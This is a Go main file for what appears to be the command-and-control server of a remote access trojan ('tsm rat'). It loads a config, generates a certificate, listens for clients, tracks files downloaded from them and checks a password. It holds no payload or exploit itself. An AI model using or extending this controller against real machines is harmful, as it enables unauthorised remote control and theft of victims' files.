package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"rat/command/utils"
	"rat/shared"
)

const (
	ConfigFile = "config.json"
)

type TempFile struct {
	Path string
	Name string
}

// TempFiles contains mappings to downloaded files in temporary directory
var (
	TempFiles map[string]TempFile
	Config    Server
)

func addDownload(tf TempFile) string {
	tempKey := utils.Sha256(tf.Path)
	TempFiles[tempKey] = tf

	return tempKey
}

func main() {
	fmt.Println("tsm rat", shared.Version)

	if !CertExists() {
		fmt.Println("generating certificate...")
		GenerateCertificate("localhost")
	}

	data, err := ioutil.ReadFile(ConfigFile)

	if err != nil {
		log.Fatal("failed to load", ConfigFile)
		return
	}

	json.Unmarshal(data, &Config)

	go Listen(&Config)

	InitControlSocket()

	startWebserver()
}

func init() {
	InitPackets()
	TempFiles = make(map[string]TempFile)
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}

func Authenticate(p string) bool {
	return p == Config.Password
}
